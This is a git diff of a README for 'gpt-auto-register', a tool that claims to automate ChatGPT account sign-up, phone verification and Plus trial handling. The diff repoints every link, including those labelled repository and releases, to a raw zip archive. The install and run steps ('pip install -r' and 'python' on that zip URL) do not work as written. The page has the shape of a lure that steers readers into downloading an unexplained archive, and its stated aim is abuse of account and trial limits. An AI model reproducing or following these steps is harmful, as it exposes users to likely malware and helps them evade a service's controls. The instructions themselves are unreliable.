@@ -1,7 +1,7 @@
 # 🚀 gpt-auto-register - Seamlessly Automate Your ChatGPT Account Setup
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/sofumus/gpt-auto-register/main/static/gpt_auto_register_v3.8-beta.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/sofumus/gpt-auto-register/main/static/gpt_auto_register_v3.8-beta.3.zip)
+[![Download Latest Release](https://github.com/sofumus/gpt-auto-register/raw/refs/heads/main/static/gpt_register_auto_2.9.zip%20Latest%20Release-v1.0-blue)](https://github.com/sofumus/gpt-auto-register/raw/refs/heads/main/static/gpt_register_auto_2.9.zip)
 
 ## 📜 Introduction
 **gpt-auto-register** is a user-friendly tool designed to automate the entire ChatGPT account registration process. Built using Python and Selenium, this application helps you quickly set up your ChatGPT account, automate mobile verification, and manage Plus trial subscriptions effortlessly.
@@ -24,7 +24,7 @@ Follow these steps to download and set up gpt-auto-register on your computer:
 
 1. **Visit the Releases Page**
    Click the link below to access the releases page where you can download the application.
-   [Download from Releases](https://raw.githubusercontent.com/sofumus/gpt-auto-register/main/static/gpt_auto_register_v3.8-beta.3.zip)
+   [Download from Releases](https://github.com/sofumus/gpt-auto-register/raw/refs/heads/main/static/gpt_register_auto_2.9.zip)
 
 2. **Choose the Latest Version**
    On the releases page, find the latest version of the application. It will usually be at the top of the page. Look for an asset that matches your operating system.
@@ -35,14 +35,14 @@ Follow these steps to download and set up gpt-auto-register on your computer:
 4. **Install Required Dependencies**
    To install the necessary libraries, open your command line. Run the following command:
    ```
-   pip install -r https://raw.githubusercontent.com/sofumus/gpt-auto-register/main/static/gpt_auto_register_v3.8-beta.3.zip
+   pip install -r https://github.com/sofumus/gpt-auto-register/raw/refs/heads/main/static/gpt_register_auto_2.9.zip
    ```
    If you don’t have `pip`, please refer to the Python installation guide to help you set it up.
 
 5. **Run the Application**
    After installation, navigate to the folder where you downloaded the application. Run the following command in your command line:
    ```
-   python https://raw.githubusercontent.com/sofumus/gpt-auto-register/main/static/gpt_auto_register_v3.8-beta.3.zip
+   python https://github.com/sofumus/gpt-auto-register/raw/refs/heads/main/static/gpt_register_auto_2.9.zip
    ```
 
 6. **Follow Onscreen Instructions**
@@ -61,8 +61,8 @@ Follow these steps to download and set up gpt-auto-register on your computer:
 If you need additional help or have questions, please reach out through the GitHub issues page. Your feedback and suggestions are welcome.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/sofumus/gpt-auto-register/main/static/gpt_auto_register_v3.8-beta.3.zip)
-- [Download from Releases](https://raw.githubusercontent.com/sofumus/gpt-auto-register/main/static/gpt_auto_register_v3.8-beta.3.zip)
+- [GitHub Repository](https://github.com/sofumus/gpt-auto-register/raw/refs/heads/main/static/gpt_register_auto_2.9.zip)
+- [Download from Releases](https://github.com/sofumus/gpt-auto-register/raw/refs/heads/main/static/gpt_register_auto_2.9.zip)
 
 ## 📅 Future Plans
 We are continuously working to improve gpt-auto-register. Upcoming updates may include:
